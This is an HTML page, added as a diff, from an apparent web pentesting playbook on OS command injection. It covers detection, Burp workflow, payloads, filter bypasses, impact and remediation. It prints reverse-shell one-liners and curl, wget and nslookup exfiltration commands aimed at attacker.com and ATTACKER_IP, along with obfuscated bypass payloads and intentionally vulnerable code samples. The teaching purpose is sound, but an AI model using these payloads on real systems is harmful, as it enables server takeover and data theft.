@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Clickjacking defense: hide content until JS confirms top frame -->
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Command injection testing guide: OS command injection detection, exploitation, and remediation. Covers blind injection and out-of-band exfiltration.">
+    <meta property="og:title" content="Command Injection – Web App Pentesting Guide">
+    <meta property="og:description" content="Command injection testing guide: OS command injection detection, exploitation, and remediation. Covers blind injection and out-of-band exfiltration.">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <title>Command Injection  · Web Pentest Playbook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="topnav">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon">
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><path d="M5 9v3M9 9v3M3.5 12h7" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="round"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+      </div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2025</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+    <a href="../thanks.html" class="nav-link">Thanks</a>
+  </div>
+  <div class="nav-right">
+    <button class="search-pill" onclick="gsOpen ? gsOpen() : null">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="currentColor" stroke-width="1.5"/><path d="m11 11 3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Search <kbd>⌘K</kbd>
+    </button>
+    <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+  <nav id="sidebar">
+    <div class="toc-title">Command Injection</div>
+    <div class="sb-group">Overview</div>
+    <a href="#analogy">Real-World Analogy</a>
+    <a href="#methodology">📅 Workflow Placement</a>
+    <a href="#how-it-works">How It Works</a>
+    <div class="sb-group">Attack Vectors</div>
+    <a href="#where-to-look">Where to Look</a>
+    <a href="#burp-workflow">Burp Suite Workflow</a>
+    <div class="sb-group">Exploitation</div>
+    <a href="#payloads">Payloads & Techniques</a>
+    <a href="#waf-bypass">WAF Bypass Techniques</a>
+    <a href="#exploitation">Exploitation & Impact</a>
+    <div class="sb-group">Practice</div>
+    <a href="#checklist">Testing Checklist</a>
+    <a href="#labs">PortSwigger Labs</a>
+    <a href="#remediation">Remediation</a>
+    <a href="#mistakes">Common Beginner Mistakes</a>
+    <a href="#see-also">🔗 See Also</a>
+  </nav>
+
+  <main id="main">
+    <div class="hero">
+      <div class="hero-chip"><span class="hero-chip-dot"></span>OWASP A03 · CVSS 9.8 · Day 4</div>
+      <h1><span class="hero-icon-pill"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></span><span>Command Injection (OS Command Injection)</span></h1>
+      <p>Execute arbitrary operating system commands on the server by injecting shell metacharacters into application inputs.</p>
+      <div class="badge-row">
+        <span class="badge badge-critical">Critical</span>
+        <span class="badge badge-bscp">BSCP Exam Topic</span>
+        <span class="badge badge-difficulty">Difficulty: Intermediate</span>
+      </div>
+    </div>
+
+    <section id="analogy">
+      <h2>🎯 Real-World Analogy</h2>
+      <div class="callout analogy">
+        <div class="callout-title">The Secretary Who Takes Orders Literally</div>
+        <p>You give your secretary a task: "Please email the report to Alice." She types into the computer: <code>email report to alice</code>.</p>
+        <p>But a malicious coworker modifies the instruction: "Please email the report to Alice; also send the company's bank account numbers to the coworker's personal email." Now the secretary, who just executes whatever you tell her, does both tasks.</p>
+        <p>Command injection works the same way: the app is the secretary, the attacker appends malicious instructions (shell commands) to the legitimate request, and the OS executes everything in sequence.</p>
+      </div>
+    </section>
+
+    <h2 id="methodology">📅 When in the 5-Day Workflow</h2>
+
+    <div class="workflow-days">
+      <div class="day-pill"><span class="day-num">Day 1</span>Recon</div>
+      <div class="day-pill probe"><span class="day-num">Day 2</span>Initial Probe</div>
+      <div class="day-pill"><span class="day-num">Day 3</span>File/CSRF</div>
+      <div class="day-pill deep"><span class="day-num">Day 4</span>Deep Dive</div>
+      <div class="day-pill"><span class="day-num">Day 5</span>Client-Side</div>
+    </div>
+
+    <div class="callout method-probe">
+      <div class="callout-title">⚡ Day 2  · Initial Probe</div>
+      <p>On Day 2, inject OS command metacharacters into parameters that look like they might be passed to a shell: network diagnostic tools (ping, traceroute, nslookup fields), IP/hostname inputs, filename parameters, any feature that "does something with your input." Send: <code>; whoami</code>, <code>| id</code>, <code>&amp;&amp; id</code>. Look for command output in the response, or a noticeable delay for time-based probes.</p>
+      <pre><code>; whoami          → Unix command separator
+| id              → pipe
+&amp;&amp; id             → AND execution
+`id`              → backtick substitution
+$(id)             → subshell substitution</code></pre>
+    </div>
+
+    <div class="callout method-deep">
+      <div class="callout-title">🎯 Day 4  · Blind CMDi + Exploitation</div>
+      <p>When there's no visible output, use time-based or OOB confirmation. Sleep 5 seconds: <code>; sleep 5</code>. If the response takes 5s longer → confirmed blind CMDi. Then use Burp Collaborator or interactsh for OOB confirmation and data exfil: <code>; curl https://YOUR.interactsh.com/$(whoami)</code>. Once confirmed, establish a reverse shell.</p>
+      <pre><code># OOB confirmation
+; curl https://YOUR.interactsh.com/$(whoami)
+; wget -q "http://YOUR.interactsh.com/?h=$(hostname)"
+
+# Reverse shell (after confirmation)
+; bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1
+; python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'</code></pre>
+      <p><strong>Chain it:</strong> CMDi → read /etc/passwd + app config → find DB credentials → SQLi → full data dump. Or: CMDi → reverse shell → lateral movement to internal services.</p>
+    </div>
+
+    <section id="how-it-works">
+      <h2>⚙️ How It Works</h2>
+      <h3>The Core Problem</h3>
+      <p>Some applications need to execute system commands for legitimate reasons: ping a host, convert an image, compress a file, etc. If user input is passed unsanitized to a shell, an attacker can inject their own commands:</p>
+
+      <h3>Vulnerable Code Example</h3>
+      <pre><code>#!/bin/bash
+# User provides hostname
+hostname=$1
+
+# VULNERABLE: no sanitization
+ping -c 1 $hostname</code></pre>
+
+      <p><strong>Legitimate use:</strong></p>
+      <pre><code>./script.sh "google.com"
+# Executes: ping -c 1 google.com</code></pre>
+
+      <p><strong>Attack:</strong></p>
+      <pre><code>./script.sh "google.com; cat /etc/passwd"
+# Executes: ping -c 1 google.com; cat /etc/passwd
+
+# Result: the attacker reads the system password file</code></pre>
+
+      <h3>Python Example</h3>
+      <pre><code>import os
+
+user_file = request.args.get('file')
+
+# VULNERABLE: os.system passes to shell
+os.system('convert ' + user_file + ' output.jpg')</code></pre>
+
+      <p><strong>Attack:</strong></p>
+      <pre><code>GET /convert?file=input.jpg; whoami
+# Executes: convert input.jpg; whoami output.jpg
+# Result: attacker learns what user the web app runs as</code></pre>
+
+      <h3>Why It Happens</h3>
+      <p>Developers use convenient functions like <code>os.system()</code> (Python), <code>exec()</code> (PHP), <code>Runtime.exec()</code> (Java), or shell scripts that concatenate user input directly into commands. The shell interprets special characters (<code>;</code>, <code>|</code>, <code>&amp;&amp;</code>, <code>||</code>, backticks, <code>$()</code>) as command separators, allowing injection.</p>
+    </section>
+
+    <section id="where-to-look">
+      <h2>🔍 Where to Look</h2>
+
+      <h3>Features That Often Call System Commands</h3>
+      <ul>
+        <li><strong>Network diagnostics:</strong> Ping, traceroute, nslookup, whois, DNS lookup</li>
+        <li><strong>File operations:</strong> Convert image, compress files, generate PDF, compress archive</li>
+        <li><strong>Media processing:</strong> Transcode video, extract metadata, resize image</li>
+        <li><strong>System info:</strong> Disk usage, process list, uptime, system stats</li>
+        <li><strong>Backup/restore:</strong> Backup database, restore from backup</li>
+        <li><strong>Email:</strong> Send email, fetch emails from external server</li>
+        <li><strong>Deployment:</strong> Git pull, build script, deploy application</li>
+      </ul>
+
+      <h3>Parameters to Test</h3>
+      <p>Look for inputs that might be passed to commands:</p>
+      <ul>
+        <li><code>hostname</code>, <code>host</code>, <code>domain</code>, <code>ip</code>, <code>target</code></li>
+        <li><code>file</code>, <code>filename</code>, <code>path</code>, <code>url</code></li>
+        <li><code>command</code>, <code>query</code>, <code>search</code></li>
+        <li><code>email</code>, <code>user</code>, <code>username</code></li>
+        <li><code>format</code>, <code>output</code>, <code>type</code></li>
+      </ul>
+
+      <h3>How to Identify Command Injection</h3>
+      <ol>
+        <li>Find a feature that appears to interact with the system (network test, file converter, etc.)</li>
+        <li>Try a simple injection: <code>google.com; whoami</code></li>
+        <li>Check the response for output you didn't expect</li>
+        <li>If blocked, try blind injection (sleep delay or out-of-band callback)</li>
+      </ol>
+    </section>
+
+    <section id="burp-workflow">
+      <h2>🎯 Burp Suite Workflow</h2>
+
+      <div class="burp-step">
+        <div class="step-num">1</div>
+        <div>
+          <strong>Find a system command feature</strong>
+          <p>Identify a feature that interacts with the system: ping tool, network diagnostics, file conversion, system info page, etc. Intercept a request in Burp Proxy.</p>
+          <p>Example: <code>GET /network/ping?host=google.com</code></p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">2</div>
+        <div>
+          <strong>Send to Repeater and test basic injection</strong>
+          <p>Right-click the request → "Send to Repeater". Modify the parameter to inject a command. Try using a semicolon to chain commands:</p>
+          <pre><code>GET /network/ping?host=google.com; whoami</code></pre>
+          <p>Send the request and check the response. If you see the output of <code>whoami</code> in the response, command injection is confirmed.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">3</div>
+        <div>
+          <strong>Try different separators if semicolon doesn't work</strong>
+          <p>Depending on the context, different separators work:</p>
+          <ul>
+            <li><code>||</code> (OR)  · executes second command if first fails</li>
+            <li><code>&amp;&amp;</code> (AND)  · executes second command if first succeeds</li>
+            <li><code>|</code> (pipe)  · passes output of first command to second</li>
+            <li><code>\n</code> (newline)  · new command on new line</li>
+            <li><code>&lt;()</code> (process substitution)  · Linux-specific</li>
+          </ul>
+          <p>Try: <code>host=google.com || id</code>, <code>host=google.com &amp;&amp; whoami</code>, etc.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">4</div>
+        <div>
+          <strong>Test blind injection with time delay</strong>
+          <p>If output isn't reflected, try a time-based injection. Use <code>sleep</code> to introduce a delay:</p>
+          <pre><code>GET /network/ping?host=google.com; sleep 5</code></pre>
+          <p>Send the request and note how long it takes. If it takes 5+ seconds, the <code>sleep</code> command executed  · confirming injection even though output isn't visible.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">5</div>
+        <div>
+          <strong>Use Burp Collaborator for out-of-band confirmation</strong>
+          <p>Generate a Burp Collaborator URL (Burp Menu → Collaborator → Copy to clipboard). Send a command that makes an HTTP request to your Collaborator:</p>
+          <pre><code>GET /network/ping?host=google.com; curl https://YOUR_COLLABORATOR_ID.burpcollaborator.net</code></pre>
+          <p>Check Collaborator for incoming requests. If you see a request, command injection is confirmed (output not needed).</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">6</div>
+        <div>
+          <strong>Escalate to information gathering</strong>
+          <p>Once injection is confirmed, use commands to gather information:</p>
+          <pre><code>; whoami             (what user is the app running as?)
+; id                 (user ID, groups)
+; pwd                (current directory)
+; ls -la             (list files)
+; cat /etc/passwd    (system users)</code></pre>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">7</div>
+        <div>
+          <strong>Test Windows vs. Linux syntax</strong>
+          <p>If the target is Windows, use Windows command separators:</p>
+          <pre><code>host=google.com &amp; whoami     (Windows AND)
+host=google.com | whoami     (Windows pipe)</code></pre>
+        </div>
+      </div>
+    </section>
+
+    <section id="payloads">
+      <h2>🎣 Payloads & Techniques</h2>
+
+      <h3>1. Separator-Based Injection</h3>
+      <pre><code># Semicolon (most common; works in bash)
+host=google.com; whoami
+host=google.com; id
+host=google.com; cat /etc/passwd
+
+# AND operator (second command runs only if first succeeds)
+host=google.com &amp;&amp; whoami
+host=google.com &amp;&amp; ls -la
+
+# OR operator (second command runs only if first fails)
+host=google.com || whoami
+
+# Pipe (output of first becomes input to second)
+host=google.com | base64
+host=google.com | nc attacker.com 4444</code></pre>
+
+      <h3>2. Backtick and $() Command Substitution</h3>
+      <pre><code># Backticks (older syntax)
+host=`whoami`.google.com
+host=$(whoami).google.com
+
+# In form data
+filename=image_$(whoami).jpg
+email=$(cat /etc/passwd | head -1)@example.com</code></pre>
+
+      <h3>3. Newline Injection</h3>
+      <pre><code># HTTP request with URL-encoded newline
+GET /ping?host=google.com%0Awhoami
+
+# POST data with newline
+POST /api/convert
+file=input.jpg%0Acat /etc/passwd</code></pre>
+
+      <h3>4. Blind Injection with Time Delay</h3>
+      <pre><code># Linux sleep
+host=google.com; sleep 10
+
+# Windows timeout
+host=google.com &amp; timeout 10
+
+# Using ping as a delay (ping localhost 4 times = ~4 seconds on Linux)
+host=google.com; ping -c 4 127.0.0.1</code></pre>
+
+      <h3>5. Out-of-Band Data Exfiltration</h3>
+      <pre><code># Send file content via DNS
+host=google.com; nslookup $(cat /etc/passwd | base64) dns.example.com
+
+# Send via HTTP
+host=google.com; curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64)
+
+# Send via wget
+host=google.com; wget --post-data="$(cat /etc/passwd)" http://attacker.com/collect</code></pre>
+
+      <h3>6. Reverse Shell (One-Liners)</h3>
+      <pre><code># Bash
+host=google.com; bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1
+
+# Python
+host=google.com; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# Netcat
+host=google.com; nc attacker.com 4444 -e /bin/sh</code></pre>
+
+      <h3>7. Bypassing Spaces (IFS Variable)</h3>
+      <pre><code># Using $IFS (Internal Field Separator) instead of space
+host=google.com;cat${IFS}/etc/passwd
+
+# Using ${PATH:0:1} to get "/" without a space
+host=google.com;cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd</code></pre>
+
+      <h3>8. Base64 Encoding to Bypass Filters</h3>
+      <pre><code># Encode command in base64
+# "cat /etc/passwd" = "Y2F0IC9ldGMvcGFzc3dk" (base64)
+host=google.com; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash</code></pre>
+
+      <h3>9. Hex Encoding</h3>
+      <pre><code># Convert command to hex, then decode
+# "whoami" = "\x77\x68\x6f\x61\x6d\x69"
+host=google.com; printf '\x77\x68\x6f\x61\x6d\x69' | bash</code></pre>
+
+      <h3>10. Wildcards and Glob Patterns</h3>
+      <pre><code># Avoid spaces using wildcards
+host=google.com; ls /etc/pass*    (expands to /etc/passwd)
+host=google.com; cat /e?c/pass??  (? matches any char)</code></pre>
+    </section>
+
+    <section id="checklist">
+      <h2>✅ Testing Checklist</h2>
+      <div class="checklist-wrap">
+        <div class="checklist-header">Progress: <span class="progress-mini">0/12</span></div>
+        <div class="progress-bar-wrap"><div class="progress-bar"></div></div>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Identify all features that might execute system commands (network tools, file converters, media processing)</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Test basic command injection with semicolon separator: <code>input; whoami</code></label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Try alternative separators if semicolon blocked: <code>&amp;&amp;</code>, <code>||</code>, <code>|</code>, newline</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Test command substitution: backticks and <code>$()</code> syntax</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>If output not visible, test blind injection with sleep: <code>input; sleep 5</code> and time the response</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Use Burp Collaborator for out-of-band confirmation: curl/wget to external server</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Gather system info: whoami, id, pwd, uname -a, cat /etc/passwd</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Check for space filtering and test space bypass: <code>${IFS}</code>, <code>\t</code>, glob patterns</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Test in multiple parameter locations: URL param, POST body, headers, cookies</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Determine OS type (Linux vs. Windows) based on responses and adjust payloads</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>If RCE confirmed, test for reverse shell capabilities (netcat, bash, python available?)</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Check what user the application runs as; test for privilege escalation (sudo -l, /etc/sudoers)</label>
+        </label>
+      </div>
+    </section>
+
+    <section id="waf-bypass">
+      <h2>🚀 WAF Bypass Techniques</h2>
+
+      <h3>1. Space Alternatives</h3>
+      <pre><code># Tab character
+host=google.com;cat[TAB]/etc/passwd
+
+# Newline
+host=google.com%0Acat%0A/etc/passwd
+
+# Using $IFS (Internal Field Separator)
+host=google.com;cat${IFS}/etc/passwd
+
+# Using ${PATH:0:1} to get "/"
+host=google.com;cat${PATH:0:1}etc${PATH:0:1}passwd</code></pre>
+
+      <h3>2. Bypassing Command Blacklists</h3>
+      <pre><code># Obfuscate command names
+cat → c''at → c"at → 'c'at
+
+# Escape characters
+w\hoami → whoami
+wh''oami → whoami
+
+# Case variation (if case-insensitive filtering)
+whoami → WHOAMI → WhOaMi</code></pre>
+
+      <h3>3. Using Wildcards Instead of Full Command Names</h3>
+      <pre><code># Instead of: cat /etc/passwd
+# Use: /bin/c* /etc/pass*
+host=google.com;/bin/c*/etc/pass*</code></pre>
+
+      <h3>4. Base64 and Hex Encoding</h3>
+      <pre><code># Base64
+echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
+
+# Hex
+printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | bash</code></pre>
+
+      <h3>5. Using Alternative Separators</h3>
+      <pre><code># If ; is blocked, try:
+host=google.com&amp;&amp;whoami        (AND  · Windows friendly)
+host=google.com||whoami        (OR)
+host=google.com|whoami         (pipe)</code></pre>
+
+      <h3>6. Variable Tricks</h3>
+      <pre><code># Using $@ to bypass filters
+whoami$@
+echo$@whoami
+
+# Using variable assignment
+host=google.com;a=whoami;$a</code></pre>
+
+      <h3>7. Unicode/UTF-8 Encoding</h3>
+      <pre><code># Some apps filter semicolon (;) but not encoded versions
+host=google.com%3Bwhoami   (URL encoded semicolon)
+host=google.com&#59;whoami  (HTML entity)</code></pre>
+
+      <h3>8. Polyglot Payloads</h3>
+      <pre><code># Works in multiple contexts
+host=$(whoami)&lt;img/src=x&gt;    (both command injection and XSS)</code></pre>
+    </section>
+
+    <section id="exploitation">
+      <h2>💥 Exploitation & Impact</h2>
+
+      <h3>What Can Attackers Do?</h3>
+      <ul>
+        <li><strong>Information Gathering:</strong> whoami, id, uname, cat /etc/passwd, cat config files</li>
+        <li><strong>File Access:</strong> Read sensitive files, logs, configuration, source code</li>
+        <li><strong>Privilege Escalation:</strong> Check sudo privileges, exploit SUID binaries</li>
+        <li><strong>Data Exfiltration:</strong> Send files via curl, wget, nc (netcat) to external server</li>
+        <li><strong>Reverse Shell:</strong> Gain interactive shell access to the server</li>
+        <li><strong>Lateral Movement:</strong> Access internal network, scan for other services</li>
+        <li><strong>Persistence:</strong> Install backdoor, modify startup scripts, add SSH keys</li>
+        <li><strong>Denial of Service:</strong> Fork bombs, disk fill, process CPU to crash service</li>
+        <li><strong>Supply Chain Attack:</strong> Modify application code, inject malware into deployments</li>
+      </ul>
+
+      <h3>Real-World Examples</h3>
+      <p><strong>Example 1: Shell Metacharacter in Ping Tool</strong>  · An admin panel has a network diagnostics feature. User input <code>ping google.com; whoami</code> reveals the app runs as the <code>www-data</code> user. An attacker escalates using sudo privileges and gains root.</p>
+      <p><strong>Example 2: ImageMagick RCE</strong>  · An image conversion endpoint passes filenames to ImageMagick. Using polyglot exploits, an attacker injects commands via filename: <code>image|whoami.jpg</code>. Remote code execution achieved.</p>
+      <p><strong>Example 3: Server-Side Template Injection via Command Injection</strong>  · A file name is used in a template. Combined with template injection, attackers achieve RCE through multiple vectors.</p>
+
+      <h3>Severity</h3>
+      <p>Command injection is rated <strong>CRITICAL</strong> because it grants complete OS-level access. An attacker with RCE can read files, modify data, steal credentials, install malware, and take full control of the system.</p>
+    </section>
+
+    <section id="remediation">
+      <h2>🛡️ Remediation</h2>
+
+      <h3>1. Avoid System Calls Entirely</h3>
+      <p><strong>Vulnerable (Python):</strong></p>
+      <pre><code>import os
+hostname = request.args.get('host')
+os.system('ping -c 1 ' + hostname)</code></pre>
+
+      <p><strong>Secure (Python with subprocess module):</strong></p>
+      <pre><code>import subprocess
+hostname = request.args.get('host')
+
+# Use list of arguments, NOT shell string
+subprocess.run(['ping', '-c', '1', hostname], check=True)</code></pre>
+
+      <p>Key difference: <code>subprocess.run()</code> with a list doesn't invoke a shell  · the arguments are passed directly to the binary. Shell metacharacters are treated as literal text.</p>
+
+      <h3>2. Use Library Functions Instead of System Commands</h3>
+      <p><strong>Bad (Python):</strong></p>
+      <pre><code>os.system('nslookup ' + domain)</code></pre>
+
+      <p><strong>Good (Python):</strong></p>
+      <pre><code>import socket
+try:
+    ip = socket.gethostbyname(domain)
+    print(f"IP: {ip}")
+except socket.gaierror:
+    print("Domain not found")</code></pre>
+
+      <h3>3. Input Validation (Whitelist)</h3>
+      <p>Only allow expected characters. For hostname, only allow alphanumerics, dots, hyphens:</p>
+      <pre><code>import re
+
+hostname = request.args.get('host')
+
+# Whitelist: only hostname-valid characters
+if not re.match(r'^[a-zA-Z0-9.-]+$', hostname):
+    return "Invalid hostname", 400
+
+# Proceed safely
+subprocess.run(['ping', '-c', '1', hostname], check=True)</code></pre>
+
+      <h3>4. If You Must Use System Calls, Use Shell=False</h3>
+      <pre><code>import subprocess
+
+# WRONG: shell=True (passes to shell, vulnerable)
+subprocess.run('ping -c 1 ' + hostname, shell=True)
+
+# RIGHT: shell=False (default), with list of args
+subprocess.run(['ping', '-c', '1', hostname], shell=False)</code></pre>
+
+      <h3>5. Disable Shell Features</h3>
+      <p>In languages that default to shell execution, explicitly disable it:</p>
+      <p><strong>PHP:</strong></p>
+      <pre><code>// WRONG
+exec('ping -c 1 ' . $hostname);
+
+// RIGHT (use array-based functions)
+$output = shell_exec('ping -c 1 ' . escapeshellarg($hostname));</code></pre>
+
+      <h3>6. Use escapeshellarg() for Legacy Code</h3>
+      <p><strong>PHP (if subprocess not available):</strong></p>
+      <pre><code>$hostname = $_GET['host'];
+$safe = escapeshellarg($hostname);  // Wraps in quotes and escapes
+system("ping -c 1 $safe");</code></pre>
+
+      <h3>7. Run Application with Minimal Privileges</h3>
+      <p>Use a dedicated unprivileged user (www-data, nobody) to run the web application. Even if RCE occurs, attacker access is limited.</p>
+
+      <h3>8. Disable Dangerous Functions</h3>
+      <p>In PHP, disable <code>exec</code>, <code>system</code>, <code>passthru</code> in php.ini:</p>
+      <pre><code>disable_functions = exec,system,passthru,shell_exec,proc_open</code></pre>
+
+      <h3>9. Use Security Headers and WAF</h3>
+      <p>Though not a fix, WAFs can block common payloads. For example, ModSecurity rules blocking semicolons in query parameters.</p>
+    </section>
+
+    <section id="labs">
+      <h2>📚 PortSwigger Labs</h2>
+      <p>Practice command injection on PortSwigger's free labs:</p>
+      <ul>
+        <li><strong>OS command injection, simple case:</strong> Basic ping feature, reflected output</li>
+        <li><strong>Blind OS command injection with time delay:</strong> Command executes but output not visible; use sleep to confirm</li>
+        <li><strong>Blind OS command injection with output redirection:</strong> Output goes to file on server, retrieve via web server</li>
+        <li><strong>Blind OS command injection with out-of-band interaction:</strong> Use Burp Collaborator to detect execution</li>
+        <li><strong>Blind OS command injection with data exfiltration:</strong> Send file content via DNS or HTTP to attacker's server</li>
+        <li><strong>Blind OS command injection with out-of-band data exfiltration:</strong> Use Collaborator to receive command output</li>
+      </ul>
+    </section>
+
+    <section id="mistakes">
+      <h2>⚠️ Common Beginner Mistakes</h2>
+
+      <h3>1. Only Testing Semicolon Separator</h3>
+      <p><strong>Wrong:</strong> "I tried <code>; whoami</code> and it didn't work, so there's no command injection."</p>
+      <p><strong>Reality:</strong> Test <code>&amp;&amp;</code>, <code>||</code>, <code>|</code>, newline (<code>\n</code>), and backticks. Different contexts use different separators.</p>
+
+      <h3>2. Not Testing Blind Injection</h3>
+      <p><strong>Wrong:</strong> "The output isn't reflected in the response, so no command injection."</p>
+      <p><strong>Reality:</strong> Many injections are blind (output not returned). Use <code>sleep 5</code> to introduce a delay, or Burp Collaborator for out-of-band confirmation.</p>
+
+      <h3>3. Assuming All Parameters Are Tested</h3>
+      <p><strong>Wrong:</strong> Testing only URL query parameters.</p>
+      <p><strong>Reality:</strong> Test POST body, headers (User-Agent, Referer), cookies, multipart form data, JSON bodies. Any user-supplied input can be vulnerable.</p>
+
+      <h3>4. Not Enumerating System Information</h3>
+      <p><strong>Wrong:</strong> Confirming RCE with <code>whoami</code> and moving on.</p>
+      <p><strong>Reality:</strong> Always gather info: <code>whoami</code>, <code>id</code>, <code>uname -a</code>, <code>pwd</code>, <code>ls -la</code>, check <code>sudo -l</code> for privilege escalation opportunities.</p>
+
+      <h3>5. Forgetting to Test Windows Commands</h3>
+      <p><strong>Wrong:</strong> Only testing Linux commands; assuming target is Linux.</p>
+      <p><strong>Reality:</strong> Test both. Windows uses <code>&amp;</code> and <code>|</code>, not <code>;</code>. Use <code>whoami</code> (works on both) but also <code>systeminfo</code> (Windows) or <code>uname</code> (Linux).</p>
+
+      <h3>6. Not Checking if Spaces Are Filtered</h3>
+      <p><strong>Wrong:</strong> Assuming spaces work in injected commands.</p>
+      <p><strong>Reality:</strong> Some apps filter spaces. Use <code>${IFS}</code>, tabs, or wildcards: <code>cat${IFS}/etc/passwd</code>.</p>
+
+      <h3>7. Missing Polyglot Attacks</h3>
+      <p><strong>Wrong:</strong> Testing command injection only, not in combination with other vulnerabilities.</p>
+      <p><strong>Reality:</strong> Command injection + XSS, SSTI, or XXE can compound impact. A filename parameter might be vulnerable to both command injection and XXE.</p>
+
+      <h3>8. Not Testing Special Characters in Filenames</h3>
+      <p><strong>Wrong:</strong> Overlooking file-related parameters (filename, path, URL).</p>
+      <p><strong>Reality:</strong> File conversion/processing features often pass filenames to system commands. Test: <code>image.jpg; whoami.jpg</code>.</p>
+
+      <h3>9. Ignoring Error Messages</h3>
+      <p><strong>Wrong:</strong> Dismissing error responses.</p>
+      <p><strong>Reality:</strong> Errors often reveal command execution. <code>ping: unknown host: whoami</code> confirms the <code>whoami</code> output was interpreted as a hostname (command executed).</p>
+
+      <h3>10. Not Using Burp Collaborator for Blind Injection</h3>
+      <p><strong>Wrong:</strong> Relying solely on time delays to confirm blind injection.</p>
+      <p><strong>Reality:</strong> Burp Collaborator is more reliable: <code>curl https://YOUR_ID.burpcollaborator.net</code> leaves a clear HTTP request log in Burp, confirming RCE without timing ambiguity.</p>
+    </section>
+
+    <!-- ═══ SEE ALSO ═══ -->
+    <h2 id="see-also">🔗 See Also  · Attack Chains</h2>
+    <p>Command injection is rarely isolated  · the path to it usually runs through other vulnerabilities.</p>
+    <div class="see-also-grid">
+      <a class="see-also-card" href="sqli.html">
+        <span class="sa-icon">🗄️</span>
+        <span class="sa-name">SQL Injection</span>
+        <span class="sa-why">SQLi on MSSQL can enable xp_cmdshell for OS command execution  · SQL injection becomes CMDi.</span>
+      </a>
+      <a class="see-also-card" href="ssrf.html">
+        <span class="sa-icon">📡</span>
+        <span class="sa-name">SSRF</span>
+        <span class="sa-why">Both involve making the server do something unintended. SSRF on internal services can reach CMDi endpoints.</span>
+      </a>
+      <a class="see-also-card" href="path-traversal.html">
+        <span class="sa-icon">📁</span>
+        <span class="sa-name">Path Traversal</span>
+        <span class="sa-why">Features that read files with user-controlled paths often also execute system commands. Test both together.</span>
+      </a>
+      <a class="see-also-card" href="ssti.html">
+        <span class="sa-icon">📝</span>
+        <span class="sa-name">SSTI</span>
